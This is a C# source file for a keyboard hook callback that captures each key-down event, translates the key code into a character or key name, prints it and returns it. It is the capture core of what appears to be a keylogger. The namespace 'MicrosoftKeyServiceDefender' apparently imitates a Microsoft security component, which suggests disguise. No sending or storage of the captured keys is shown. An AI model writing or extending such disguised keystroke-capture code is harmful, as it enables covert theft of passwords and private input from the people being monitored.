using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static MicrosoftKeyServiceDefender.ServiceConstants;

namespace MicrosoftKeyServiceDefender
{
    internal class KeyboardService
    {
        public static string FindKeyboardChar(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)KeydownEvent)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                if (((Keys)vkCode).ToString() == "OemPeriod")
                {
                    Console.Out.Write(".");
                    return ".";
                }
                else if (((Keys)vkCode).ToString() == "CapsLock")
                {
                    Console.Out.Write("CapsLock");
                    return "CapsLock";
                }
                else if (((Keys)vkCode).ToString() == "Space")
                {
                    Console.Out.Write(" ");
                    return " ";
                }
                else if (((Keys)vkCode).ToString() == "D1")
                {
                    Console.Out.Write("1");
                    return "1";
                }
                else if (((Keys)vkCode).ToString() == "D2")
                {
                    Console.Out.Write("2");
                    return "2";
                }
                else if (((Keys)vkCode).ToString() == "D3")
                {
                    Console.Out.Write("3");
                    return "3";
                }
                else if (((Keys)vkCode).ToString() == "D4")
                {
                    Console.Out.Write("4");
                    return "4";
                }
                else if (((Keys)vkCode).ToString() == "D5")
                {
                    Console.Out.Write("5");
                    return "5";
                }
                else if (((Keys)vkCode).ToString() == "D6")
                {
                    Console.Out.Write("6");
                    return "6";
                }
                else if (((Keys)vkCode).ToString() == "D7")
                {
                    Console.Out.Write("7");
                    return "7";
                }
                else if (((Keys)vkCode).ToString() == "D8")
                {
                    Console.Out.Write("8");
                    return "8";
                }
                else if (((Keys)vkCode).ToString() == "D9")
                {
                    Console.Out.Write("9");
                    return "9";
                }
                else if (((Keys)vkCode).ToString() == "D0")
                {
                    Console.Out.Write("0");
                    return "0";
                }
                else if (((Keys)vkCode).ToString() == "LShift" || ((Keys)vkCode).ToString() == "RShift")
                {
                    Console.Out.Write("Shift");
                    return "Shift";
                }
                else
                {
                    Console.Out.Write((Keys)vkCode);
                    return ((Keys)vkCode).ToString();
                }
            } else
            {
                return "";
            }
        }
    }
}
